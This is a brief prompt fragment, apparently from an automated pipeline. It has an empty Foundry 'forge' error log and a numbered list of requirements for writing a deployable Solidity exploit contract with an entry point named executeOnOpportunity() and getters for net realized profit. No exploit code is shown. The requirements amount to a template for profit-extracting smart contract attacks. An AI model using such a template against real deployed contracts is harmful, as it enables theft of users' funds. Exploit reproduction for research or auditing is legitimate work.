forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
